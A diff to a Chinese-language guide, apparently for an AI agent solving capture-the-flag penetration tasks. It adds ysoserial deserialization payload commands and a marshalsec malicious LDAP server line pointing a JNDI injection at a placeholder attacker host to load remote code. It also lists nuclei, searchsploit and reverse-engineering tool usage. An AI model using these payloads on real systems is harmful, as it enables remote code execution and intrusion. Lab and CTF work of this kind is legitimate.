@@ -58,7 +58,10 @@ Kali 容器里，拥有完整的推理循环：你负责推理、决策与使用
 - **已知 CVE / 指纹题**：`nuclei -u <url> -t /opt/nuclei-templates -severity critical,high,medium -silent`
   （模板离线内置，不要 `-update-templates`）；`searchsploit <产品> <版本>` 查离线 PoC，
   `searchsploit -m <EDB-ID>` 取到当前目录后按需改写。先确认版本指纹（`whatweb`/响应头/`/version`）再查。
-- **Java 反序列化**：镜像未装 JDK；优先用 Python/curl 构造 gadget 链，或从 `searchsploit` 找现成 PoC。
+- **Java 反序列化**：`ysoserial <Gadget> '<命令>' | base64 -w0` 生成序列化 payload
+  （无参数运行 `ysoserial` 看 gadget 列表，JDK 11 运行）；`marshalsec marshalsec.jndi.LDAPRefServer
+  'http://<你的IP>:<端口>/#ExploitClass' 1389` 起恶意 LDAP 服务配合 JNDI 注入点。
+  依赖库不在目标 classpath 时改用 `searchsploit` 找现成链。
 - **二进制/逆向**：`checksec` 看保护、`r2 -A` 静态分析、`ROPgadget` 找 gadget、`patchelf` 改解释器/依赖。
 - **逐阶段验证**：每阶段产出是下一阶段的输入（凭据、token、内部 URL、文件），验证成立再推进。
 - **最后才提取目标**：链路走到目标服务后 flag 才可得。答案必须来自目标服务本身的输出，不能是入口处的推测。
